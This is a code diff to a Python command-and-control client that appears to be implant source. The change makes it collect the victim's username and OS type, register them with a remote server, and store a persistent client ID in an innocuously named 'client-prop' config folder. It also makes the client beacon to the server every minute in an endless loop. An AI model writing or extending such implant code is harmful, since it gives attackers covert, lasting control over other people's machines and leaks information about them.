@@ -1,21 +1,43 @@
 import requests
 import time
 import subprocess
+import getpass
+import os
 
 class C2Client:
     def __init__(self, server_url):
         self.server_url = server_url
-        self.client_id = ""
+        self.key_dir = self.get_key_dir()
+        self.key_file_path = os.path.join(self.key_dir, "client_id.txt")
     
-    def register(self, username):
+        if os.path.exists(self.key_file_path):
+            with open(self.key_file_path, "r") as f:
+                self.client_id = f.read().strip()
+        else:
+            os.makedirs(self.key_dir, exist_ok=True)
+            self.client_id = ""
+    
+    def register(self):
         url = f"{self.server_url}/register"
-        
-        self.client_id = "unique_client_identification_1" # TODO: Retrieve dynamically
-        username = "John Doe 1" # TODO: Retrieve dynamically
+        username = getpass.getuser()
 
-        payload = {"username": username, "client_id": self.client_id}
-        response = requests.post(url, json=payload)
-        print(response.json())
+        if not self.client_id:
+            payload = {"username": username, "client_id": "", "op_system": os.name}
+            response = requests.post(url, json=payload)
+            self.client_id = response.json().get("client_id")
+            
+            with open(self.key_file_path, "w") as f:
+                f.write(self.client_id)
+            
+            print(response.json())
+        else:
+            print(f"Using existing client ID: {self.client_id}")
+
+    def get_key_dir(self):
+        if os.name == 'nt':
+            return os.path.join(os.getenv('APPDATA'), "client-prop")
+        else:
+            return os.path.join(os.path.expanduser("~"), ".config", "client-prop")
 
     def beacon(self):
         url = f"{self.server_url}/beacon"
@@ -32,8 +54,7 @@ class C2Client:
         print(response.json())
 
     def run(self):
-        self.register("John Doe 1")
-
+        self.register()
         while True:
             self.beacon()
             time.sleep(60) # Timeout before next beacon call
